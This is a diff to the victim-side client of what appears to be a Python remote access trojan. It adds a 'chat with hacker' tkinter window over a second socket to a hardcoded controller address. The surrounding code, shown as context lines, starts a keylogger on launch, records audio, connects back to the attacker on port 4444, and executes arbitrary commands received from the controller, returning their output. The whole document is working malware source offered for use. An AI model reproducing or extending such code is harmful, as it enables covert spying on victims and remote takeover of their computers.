@@ -12,9 +12,11 @@ import sys
 import shutil
 import cv2
 import sound_record
+import tkinter
 
 ip = "192.168.1.105" #Change this value according to yourself.
 port = 4444 #Change this value according to yourself.
+chat_port = 5555
 
 my_thread = threading.Thread(target=kg.kg_Start)
 my_thread.start()
@@ -137,6 +139,41 @@ class mySocket():
         self.start = sound_record.Recording()
         self.start.Start_Record()
 
+    def Chat_Send_Messages(self):
+        message = self.client_message_entry.get()
+        self.messages.insert(tkinter.END, "\n" + "You:" + message)
+        self.chat_connection.send(message.encode())
+        self.messages.see("end")
+
+    def Chat_Get_Messages(self):
+        while True:
+            message = self.chat_connection.recv(1024).decode()
+            if message == "exit":
+                self.chat_gui.destroy()
+            self.messages.insert(tkinter.END, "\n" + "Hacker:" + message)
+            self.messages.see("end")
+
+    def Chat(self):
+        self.chat_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        self.chat_connection.connect((ip,chat_port))
+        self.chat_gui = tkinter.Tk()
+        self.chat_gui.resizable(False, False)
+        self.chat_gui.config(bg="#D9D8D7")
+        self.chat_gui.geometry("600x300")
+        self.chat_gui.title("You are chatting with hacker.")
+        self.messages = tkinter.Text(self.chat_gui, width=71, height=10, fg="#0E6B0E", bg="#000000")
+        self.messages.place(x=0, y=0)
+        self.messages.insert("1.0","Hacker wants to chat with you.Write your message 'your message' part and click the 'Send Message'.")
+        self.your_message_label = tkinter.Label(self.chat_gui, width=20, text="Your Message :", fg="#0D1C6E")
+        self.your_message_label.place(x=-30, y=250)
+        self.client_message_entry = tkinter.Entry(self.chat_gui, width=50)
+        self.client_message_entry.place(x=90, y=250)
+        self.send_button = tkinter.Button(self.chat_gui, width=20, text="Send Message", command=self.Chat_Send_Messages, bg="#000000", fg="#0E6B0E")
+        self.send_button.place(x=400, y=245)
+        self.chat_thread = threading.Thread(target=self.Chat_Get_Messages)
+        self.chat_thread.start()
+        self.chat_gui.mainloop()
+
 
     def Client_Start(self):
         while True:
@@ -211,12 +248,14 @@ class mySocket():
                     self.start.Stop_Record()
                     command_output = self.Get_File_Contents(self.sound_file)
                     os.remove(self.sound_file)
+                elif command[0] == "chat":
+                    self.Chat()
                 else:
                     command_output = self.Execute_Command(command)
             except Exception:
                 command_output = "Unknown command.For command list use 'help' command."
             self.Send_Json(command_output)
-        self.baglanti.close()
+        self.connection.close()
 def Try_Connection():
     while True:
         time.sleep(5)
